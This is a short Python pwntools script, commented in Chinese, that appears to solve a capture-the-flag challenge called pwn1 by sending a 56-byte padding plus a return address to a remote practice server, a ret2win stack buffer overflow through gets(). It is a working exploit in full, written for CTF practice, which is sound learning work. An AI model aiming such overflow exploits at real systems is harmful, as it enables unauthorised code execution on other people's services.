#!/usr/bin/env python3
"""验证: pwn1 远程 ret2win@0x4006be — gets 需换行"""
from pwn import *

context.log_level = 'info'
HOST, PORT = "node4.anna.nssctf.cn", 21468
PADDING = 56
WIN = 0x4006be

io = remote(HOST, PORT)
io.recvuntil(b"Let's guess the number.")
payload = b'A' * PADDING + p64(WIN)
io.sendline(payload)          # gets 需要 \n
out = io.recvall(timeout=5)
print("=== 远程输出 ===")
print(out.decode(errors='replace'))
io.close()
